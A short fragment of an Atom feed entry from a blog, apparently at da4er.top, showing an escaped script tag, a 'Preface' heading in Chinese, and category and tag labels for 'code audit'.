        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;一-前言&quot;&gt;&lt;a href=&quot;#一-前言&quot; class=&quot;headerlink&quot; title=&quot;一.前言&quot;&gt;&lt;/a&gt;一.前言&lt;/h3&gt;&lt;p&gt;
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://da4er.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://da4er.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
</feed>
